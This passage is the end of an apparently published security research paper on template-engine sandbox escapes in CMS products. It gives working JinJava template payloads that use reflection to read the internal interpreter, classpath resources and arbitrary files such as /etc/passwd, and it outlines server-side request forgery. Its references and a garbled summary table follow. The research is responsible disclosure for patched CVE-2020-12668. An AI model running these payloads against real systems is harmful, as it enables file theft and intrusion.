        "Cannot find method '" + method + "' in " + base.getClass() 
      ); 
    } 
    return result; 
}  
[Code Ref #12] 
However, it does not prevent Array or Map accesses returning a ​java.lang.Class instance.
Therefore, it is possible to get an instance of ​java.lang.Class if we find a method returning
java.lang.Class[]​ or ​Map​. 
JinJava Interpreter 
JinJava has another vulnerability. It exposes the internal JinJava interpreter through the ​secret
____int3rpr3t3r____​ variable. 
Having access to the interpreter, we can achieve a lot. For example, we can list all the variables
in the template context, which might give us access to undocumented objects. 
{% for key in ____int3rpr3t3r____.getContext().entrySet().toArray() %} 
    {{key.getKey()}} - {{key.getValue()}} 
{% endfor %} 
It also gives access to all filters, functions and tags: 
{% for k in ____int3rpr3t3r____.getContext(). getAllFunctions().toArray() %} 
    {{k }} 
{% endfor %} 
{% for key in ____int3rpr3t3r____.getContext().getAllTags().toArray() %} 
    {{key }} 
{% endfor %} 
{% for key in ____int3rpr3t3r____.getContext().getAllFilters().toArray() %} 
    {{key.getName() }} 
{% endfor %} 
Functions
are
particularly
interesting
since
they
give
us
access
to
java.lang.reflect.Method instances. From a ​Method, we can access arrays of their
exception and parameter types: 
{% for key in ____int3rpr3t3r____.getContext().getAllFunctions().toArray() %} 
    {{{key}} - {{key.getName()}} - {% for exc in 
key.getMethod().getExceptionTypes() %}{{exc}},{% endfor %} - {% for param in 
key.getMethod().getParameterTypes() %}{{param}},{% endfor %} 
{% endfor %} 
With that, we can finally access ​java.lang.Class​ instances. For example:  
{% set class = 
____int3rpr3t3r____.getContext().getAllFunctions().toArray()[0].getMethod().​ge
tParameterTypes​()[0] %} 
{{ class }} 
ClassLoader access 
After
we
have
access
to
a
​java.lang.Class
instance,
we
can
also
access
a
java.lang.ClassLoader instance through its ​ProtectionDomain since direct access from
Class.getClassLoader()​ is forbidden. 
{% set classLoader = class.getProtectionDomain().getClassLoader() %} 
{{ classLoader }} 
Arbitrary Classpath Resource Disclosure 
Using the ​java.lang.Class or ​java.lang.ClassLoader instances we can get access to
Classpath resources with: 
{% set is = class.getResourceAsStream("/Foo.class") %} 
{% for I in range(999) %} {% set byte = is.read() %} {{ byte }},  
{% endfor %} 
Arbitrary File Disclosure 
We can finally access arbitrary File System files, by retrieving Classpath resources as a
java.net.URL​, and then converting it to an ​java.net.URI because this class contains an
static ​resolve() method that allows us to create arbitrary URIs. Now we have a URI pointing
to the resource we want to access. We can open a connection and read its content from an
input stream: 
{% set uri = class.getResource("/").toURI() %} 
{% set url = uri.create("file:///etc/passwd").toURL() %} 
{% set is = url.openConnection().getInputStream() %} 
{% for I in range(999) %} {% set byte = is.read() %} {{ byte }},  
{% endfor %} 
Server-Side Request Forgery 
We can use a different protocol such as ​http​, ​https or ​ftp to establish a network connection and
initiate a Server-Side request forgery attack. 
These issues were fixed in version 2.5.4 (CVE-2020-12668) 
Pebble 
The Pebble team is still fixing several bypasses we found for Pebble sandbox. Details will be
released on a future date. 
Conclusions 
In this paper, we described the basic security design elements of the Template Engines used by
CMS applications. We analyzed the implementation of different security controls in products and
platforms where users can create or modify templates of dynamic content. Using different
techniques, we bypassed the sandboxes and security controls of all the CMS applications under
investigation and presented multiple ways to achieve RCE on these systems. 
We can capture the practical results of our research with the following numbers: 
●
Thirty new vulnerabilities were found and responsibly reported to the vendors.  
●
More than twenty different products were affected including: SharePoint, JinJava,
Pebble, Apache Velocity, Apache FreeMarker, Alfresco, Crafter CMS, Liferay, Atlassian
Confluence, XWiki, dotCMS, Lithium (Khoros), Cascade, HubSpot CMS, Apache OfBiz,
Apache
Syncope,
Netflix Conductor, Netflix Titus, Sonatype Nexus, DropWizard
Framework, and Apache Camel. Consumers of the above CMS products should ensure
that their patch management is up-to-date to ensure the risk of exploit is reduced. 
Based on these results, our conclusion is that this is not a problem of design or implementation
of a specific product or framework. Proper sandboxing of the user-controlled templates for
dynamic content is not a trivial task and requires addressing many high risk areas from a
security point of view.  
We hope our research increases developer awareness of where potential weaknesses in this
critical attack surface might exist and help bring these vulnerability classes into the spotlight of
the community. We believe this is a stepping stone of research around dynamic content
injection and similar problems will arise in other products or frameworks. 
References 
●
Alvaro Muñoz: .NET Serialization: Detecting and defending vulnerable endpoints 
https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-def
ending-vulnerable-endpoints  
●
Chapter 2: SharePoint Architecture 
https://docs.microsoft.com/en-us/previous-versions/office/developer/share
point-services/bb892189(v=office.12)  
●
FreeMarker Security Implications 
https://docs.huihoo.com/freemarker/2.3.22/app_faq.html#faq_template_uploa
ding_security 
●
FreeMarker Special Variable Reference 
https://freemarker.apache.org/docs/ref_specvar.html 
●
James Kettle: Server-Side Template Injection 
https://portswigger.net/research/server-side-template-injection 
●
Liam Cleary: SharePoint Security and a Web Shell 
https://www.helloitsliam.com/2015/04/30/sharepoint-security-and-a-web-she
ll  
●
Limited freemarker ssti to arbitrary liql query and manage lithium cms 
https://blog.mert.ninja/freemarker-ssti-on-lithium-cms/ 
●
Michał Bentkowski: Server Side Template Injection – on the example of Pebble 
https://research.securitum.com/server-side-template-injection-on-the-exam
ple-of-pebble/ 
●
Muñoz & Mirosh: A Journey from JNDI Manipulation to Remote Code Execution 
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-
JNDI-LDAP-Manipulation-To-RCE.pdf 
●
Muñoz & Mirosh: Friday the 13th JSON Attacks 
https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-
JSON-Attacks-wp.pdf  
●
RCE in Hubspot with EL injection in HubL 
https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-
hubl.html 
●
Remote Code Execution using Freemarker sandbox escape 
https://issues.liferay.com/browse/LPE-14371 
●
Ryan Hanson: JFrog Artifactory Insecure Freemarker Template Execution 
https://github.com/atredispartners/advisories/blob/master/ATREDIS-2019-00
06.md 
●
Server Control Properties Example 
https://docs.microsoft.com/en-us/previous-versions/aspnet/4s70936s%28v%3d
vs.100%29  
●
Shivprasad Koirala: SharePoint Quick Start FAQ 
https://www.codeproject.com/Articles/31412/SharePoint-Quick-Start-FAQ-Par
t-3  
https://www.codeproject.com/Articles/31648/SharePoint-Quick-Start-FAQ-Par
t-2  
https://www.codeproject.com/Articles/32583/SharePoint-Quick-Start-FAQ-Par
t-III  
https://www.codeproject.com/Articles/33222/SharePoint-Quick-Start-FAQ-Par
t-4  
https://www.codeproject.com/Articles/34664/SharePoint-Quick-Start-FAQ-Par
t  
https://www.codeproject.com/Articles/35557/SharePoint-Quick-Start-FAQ-Par
t-Workflows-Workfl  
●
Soroush Dalili: A Security Review of SharePoint Site Pagesitecture 
https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-page
s  
●
Soroush Dalili: Exploiting Deserialisation in ASP.NET via ViewState 
https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in
-asp-net-via-viewstate  
●
Step 4: Add your Web Part to the Safe Controls List 
https://docs.microsoft.com/en-us/previous-versions/office/developer/share
point-2007/ms581321(v=office.12)  
●
Toni Torralba: In-depth Freemarker Template Injection 
https://ackcent.com/blog/in-depth-freemarker-template-injection/ 
●
Trevor Seward: Unattended Configuration for SharePoint Server 2016 
https://thesharepointfarm.com/2016/03/unattended-configuration-for-sharep
oint-server-2016  
●
Using FreeMarker with servlets 
https://freemarker.apache.org/docs/pgui_misc_servlet.html 
●
Velocity Generic Tools
https://velocity.apache.org/tools/devel/generic.html 
●
Velocity View 
https://velocity.apache.org/tools/devel/view.html 
●
Velocity: Add Support for Static Utility Classes 
https://issues.apache.org/jira/browse/VELOCITY-102 
●
Windows SharePoint Services 3.0 - SDK Documentation 
https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525940(v
%3Dvs.90)  
https://docs.microsoft.com/en-us/previous-versions/office/developer/share
point-services/ms774825(v%3Doffice.12)  
Code References 
1.
https://referencesource.microsoft.com/#system.web/UI/TemplateControl.cs  
2.
https://referencesource.microsoft.com/#System.Web/UI/TemplateParser.cs  
3.
https://referencesource.microsoft.com/#System.Data/fx/src/data/System/Dat
a/Common/ObjectStorage.cs  
4.
https://referencesource.microsoft.com/#System.Web/UI/TemplateControl.cs  
5.
https://referencesource.microsoft.com/#System.Web/UI/WebControls/ControlP
arameter.cs  
6.
https://github.com/apache/freemarker/blob/2.3-gae/src/main/resources/free
marker/ext/beans/unsafeMethods.properties 
7.
https://raw.githubusercontent.com/apache/velocity-engine/761e3e517a65cf41
8d7220d16bb01627970bbca1/velocity-engine-core/src/main/resources/org/apac
he/velocity/runtime/defaults/velocity.properties 
8.
https://github.com/apache/velocity-engine/blob/2.2/velocity-engine-core/s
rc/main/java/org/apache/velocity/util/introspection/UberspectImpl.java 
9.
https://github.com/apache/velocity-engine/blob/2.2/velocity-engine-core/s
rc/main/java/org/apache/velocity/util/introspection/UberspectImpl.java 
10.
https://github.com/HubSpot/jinjava/blob/jinjava-2.5.3/src/main/java/com/h
ubspot/jinjava/el/ext/JinjavaBeanELResolver.java 
11.
https://github.com/HubSpot/jinjava/blob/jinjava-2.5.3/src/main/java/com/h
ubspot/jinjava/el/ext/JinjavaBeanELResolver.java 
12.
https://github.com/HubSpot/jinjava/blob/jinjava-2.5.3/src/main/java/com/h
ubspot/jinjava/el/ext/JinjavaBeanELResolver.java 
Appendix A:​ ​CMS Analysis Summary 
A
l
f
r
e
s
c
o 
L
i
f
e
r
a
y 
C
r
a
f
t
e
r 
O
f
b
i
z 
K
h
o
r
o
s 
d
o
t
C
M
S 
C
o
n
f
l
u
e
n
c
e 
X
W
i
k
i 
C
a
s
c
a
d
e 
H
u
b
S
p
o
t 
Template Engines used 
F F
V 
F F F V V V V J 
HttpServletRequest 
ServletContext  
ClassLoader 
WebApplication ClassLoader 
Instance Manager 
Spring Application Context 
Tomcat WebResourceRoot (StandardRoot) 
Struts Action 
Struts DefaultActionInvocation 
Struts OgnlValueStack 
Struts OgnlTool 
FreeMarker StaticModels 
Json Deserializers (directly exposed in the context) 
Velocity FieldTool 
Velocity ContextTool 
Velocity View 
Thread 
OSGI Bundle Context 
VelocityWebWorkUtil